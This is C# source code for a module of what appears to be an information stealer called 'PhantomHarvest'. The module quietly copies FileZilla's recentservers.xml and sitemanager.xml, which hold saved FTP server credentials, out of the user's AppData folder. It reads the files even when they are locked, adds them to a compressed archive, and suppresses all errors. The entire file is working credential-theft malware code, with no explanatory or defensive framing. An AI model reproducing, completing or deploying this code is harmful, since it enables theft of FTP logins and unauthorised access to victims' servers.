using System;
using System.IO;
using System.Text;
using System.Xml;
using PhantomHarvest.Helper;

namespace PhantomHarvest.FTPs
{
	internal class FileZilla
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				string[] files = new string[]
				{
					Path.Combine(appData, "FileZilla\\recentservers.xml"),
					Path.Combine(appData, "FileZilla\\sitemanager.xml")
				};

				foreach (string file in files)
				{
					if (File.Exists(file))
					{
						try
						{
							byte[] fileBytes = LockedFile.ReadLockedFile(file);
							if (fileBytes != null)
							{
								using (MemoryStream ms = new MemoryStream(fileBytes))
								{
									zip.AddStream(ArchiveManager.Compression.Deflate, FileZilla.FTPName + "/" + Path.GetFileName(file), ms, DateTime.Now, "");
								}
							}
						}
						catch {}
					}
				}
			}
			catch
			{
			}
		}

		public static string FTPName = "FileZilla";
	}
}
